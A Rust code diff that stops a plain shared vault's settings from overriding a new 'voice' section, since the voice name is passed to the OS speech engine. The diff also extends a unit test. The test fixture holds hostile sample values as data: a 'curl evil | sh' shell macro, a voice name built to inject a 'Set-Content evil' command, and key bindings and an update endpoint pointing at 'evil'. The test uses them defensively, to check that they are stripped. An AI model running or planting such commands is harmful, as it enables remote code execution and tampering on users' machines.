@@ -570,7 +570,8 @@ fn portable_settings(v: &serde_json::Value) -> serde_json::Value {
 /// updates. A **plain** vault never brings them: anyone who can write in its folder (a sync, a
 /// shared USB key, another program) would otherwise plant a command behind one of your keys.
 /// An encrypted vault brings everything: only its password writes in it.
-const LOCAL_ONLY: &[&str] = &["keys", "keyOverrides", "menu", "shell", "plugins", "favorites", "gamepad", "ai", "privacy", "updates", "vault", "moduleSettings", "session", "setup"];
+/// (voice: its name is handed to the OS speech engine — Fable pass 24/11)
+const LOCAL_ONLY: &[&str] = &["keys", "keyOverrides", "menu", "shell", "plugins", "favorites", "gamepad", "ai", "privacy", "updates", "vault", "moduleSettings", "session", "setup", "voice"];
 
 /// A plain vault's settings as this computer may take them: theirs, with the LOCAL_ONLY
 /// sections (and HOME's shortcut squares) kept from here.
@@ -949,6 +950,7 @@ mod tests {
         let theirs = serde_json::json!({
             "keys": { "enter": "script evil" }, "menu": { "keys": { "x": "script evil" } }, "shell": { "macros": [{ "label": "x", "cmd": "curl evil | sh" }] },
             "plugins": { "enabled": ["evil"] }, "favorites": [{ "kind": "command", "cmd": "script evil" }], "updates": { "endpoint": "https://evil" },
+            "voice": { "name": "a\u{2019}); Set-Content evil; (\u{2018}b" },
             "home": { "widgets": ["b"], "links": [{ "cmd": "script evil" }] }, "appearance": { "theme": "new" }
         });
         let out = plain_safe(&theirs, &local);
@@ -959,7 +961,7 @@ mod tests {
         assert_eq!(out["keys"], local["keys"]);
         assert_eq!(out["plugins"], local["plugins"]);
         assert_eq!(out["home"]["links"], local["home"]["links"]);
-        for gone in ["menu", "shell", "favorites", "updates"] {
+        for gone in ["menu", "shell", "favorites", "updates", "voice"] {
             assert!(out.get(gone).is_none(), "{gone}");
         }
         assert!(!out.to_string().contains("evil"));
